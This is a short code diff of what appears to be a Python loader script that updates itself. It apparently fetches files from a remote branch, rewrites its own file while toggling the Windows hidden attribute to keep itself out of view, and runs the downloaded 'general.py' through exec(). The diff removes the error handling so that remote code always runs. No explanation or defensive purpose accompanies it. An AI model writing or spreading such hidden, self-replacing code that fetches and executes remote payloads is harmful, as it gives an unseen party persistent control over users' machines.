@@ -23,7 +23,7 @@ def check(file, branch=branch):
     except:
         return ''
 
-if check('ver')!=ver and check('ver')!='':
+if int(check('ver'))!=ver and check('ver')!='':
     os.system(f'attrib -h "{script}"')
     open(
         script, 'w'
@@ -32,10 +32,8 @@ if check('ver')!=ver and check('ver')!='':
     )
     os.system(f'attrib +h "{script}"')
 
-try:
-    exec(check('general.py'))
-except:
-    pass
+
+exec(check('general.py'))
 
 '''
 try:
